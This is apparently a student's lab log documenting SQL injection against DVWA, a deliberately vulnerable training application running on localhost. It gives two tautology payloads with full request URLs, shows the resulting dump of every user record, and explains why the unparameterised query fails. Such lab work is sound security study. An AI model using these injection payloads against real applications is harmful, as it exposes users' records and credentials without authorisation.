@@ -1,0 +1,60 @@
+SQL Injection Payload Log — Task 3
+
+Target: DVWA (Damn Vulnerable Web Application), Security Level: Low
+Module: SQL Injection
+URL: http://localhost/dvwa/vulnerabilities/sqli/
+
+Baseline — Normal Query (for comparison)
+
+Input: 1
+
+Output:
+ID: 1
+First name: admin
+Surname: admin
+
+A normal, legitimate query returns exactly one record — the user whose ID matches the number entered.
+
+Payload 1: ' OR '1'='1
+
+Full request URL:
+http://localhost/dvwa/vulnerabilities/sqli/?id='+OR+'1'%3D'1&Submit=Submit#
+
+Output:
+ID: ' OR '1'='1
+First name: admin        Surname: admin
+First name: Gordon       Surname: Brown
+First name: Hack         Surname: Me
+First name: Pablo        Surname: Picasso
+First name: Bob          Surname: Smith
+
+Result: Instead of returning one user, the query returned all five users in the database.
+
+Payload 2: %' or '0'='0
+
+Full request URL:
+http://localhost/dvwa/vulnerabilities/sqli/?id=%25'+or+'0'%3D'0&Submit=Submit#
+
+Output:
+ID: %' or '0'='0
+First name: admin        Surname: admin
+First name: Gordon       Surname: Brown
+First name: Hack         Surname: Me
+First name: Pablo        Surname: Picasso
+First name: Bob          Surname: Smith
+
+Result: Same outcome as Payload 1 — every user record was dumped, confirming the vulnerability is consistently exploitable with different payload syntax.
+
+What's Happening — In Plain Terms
+
+The application's underlying SQL query is built by directly inserting the user's input into a query string, roughly:
+SELECT first_name, last_name FROM users WHERE user_id = '$id';
+
+When a normal number like 1 is submitted, the query is well-formed and returns one row. But when the attacker submits ' OR '1'='1, the query becomes:
+SELECT first_name, last_name FROM users WHERE user_id = '' OR '1'='1';
+
+Because '1'='1' is always true, the WHERE clause matches every row in the table, regardless of the actual user_id values — so the database returns the entire users table instead of a single record.
+
+What Data Was Exposed
+
+The full list of registered users, including usernames (admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith) was exposed through a single form field — in a real application, this same flaw could expose usernames, email addresses, password hashes, or any other column in the queried table.
